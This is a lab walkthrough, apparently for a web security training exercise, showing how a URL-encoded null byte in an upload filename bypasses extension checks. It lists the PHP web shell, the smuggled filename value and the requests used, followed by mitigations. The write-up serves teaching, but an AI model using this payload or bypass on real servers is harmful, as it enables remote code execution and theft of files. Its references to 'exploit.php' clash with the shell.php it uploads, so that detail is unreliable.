# Lab Name
Web shell upload via null byte extension bypass

## Vulnerability
Unrestricted File Upload – Null Byte Injection Bypass

## Objective
Bypass the application's file extension validation using a URL-encoded null byte, upload a malicious PHP file, execute it on the server, retrieve Carlos's secret, and solve the lab.

## Entry Point
Avatar Upload functionality

## Exploitation Type
Unrestricted File Upload / Null Byte Injection / Remote Code Execution (RCE)

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and upload any valid image as your avatar.

3. Return to the account page and verify that the uploaded avatar is displayed successfully.

4. In **Burp Suite**, go to **Proxy > HTTP History** and locate the request used to retrieve your uploaded avatar.

Example:

```http
GET /files/avatars/image.jpg HTTP/1.1
```

5. Send this request to **Burp Repeater**.

6. On your local machine, create a file named **shell.php** containing the following PHP code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

7. Attempt to upload **shell.php** as your avatar.

8. Observe that the application rejects the upload because only **JPG** and **PNG** files are allowed.

9. In **Proxy > HTTP History**, locate the **POST /my-account/avatar** request and send it to **Burp Repeater**.

10. In the multipart request body, locate the **Content-Disposition** header for the uploaded file.

11. Modify the filename parameter as follows:

```http
filename="shell.php%00.jpg"
```

12. Send the modified request.

13. Observe that the upload is successful. The response refers to the uploaded file as **exploit.php**, indicating that the application truncated the filename at the URL-encoded null byte and ignored the **.jpg** extension.

14. Switch to the Repeater tab containing the avatar retrieval request.

15. Replace the image filename with:

```http
GET /files/avatars/shell.php HTTP/1.1
```

16. Send the request.

17. Observe that the server executes the uploaded PHP file and returns the contents of **/home/carlos/secret** in the response.

18. Copy Carlos's secret and submit it to solve the lab.

## Payload Used

### PHP Payload

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Filename Bypass

```http
filename="shell.php%00.jpg"
```

### Request

```http
GET /files/avatars/shell.php HTTP/1.1
```

## Result
Successfully bypassed the application's file extension validation using a URL-encoded null byte, uploaded a malicious PHP file, executed it on the server, retrieved Carlos's secret, and solved the lab.

## Impact
- Remote Code Execution (RCE)
- File Upload Restriction Bypass
- Arbitrary Code Execution
- Sensitive File Disclosure
- Complete Server Compromise

## Mitigation
- Do not rely on filename extensions alone for file validation.
- Reject filenames containing null bytes or other special characters.
- Validate the canonical filename after URL decoding.
- Store uploaded files outside the web root.
- Disable execution permissions in upload directories.
- Verify uploaded files using server-side file signature (magic bytes) validation.

## Learning
This vulnerability occurs because the application validates the uploaded filename before processing URL-encoded characters. By injecting a URL-encoded null byte (`%00`) before the allowed `.jpg` extension, the server truncates the filename to **exploit.php** during processing while the validation logic incorrectly accepts it as an image. As a result, the PHP file is stored and executed on the server, leading to Remote Code Execution.
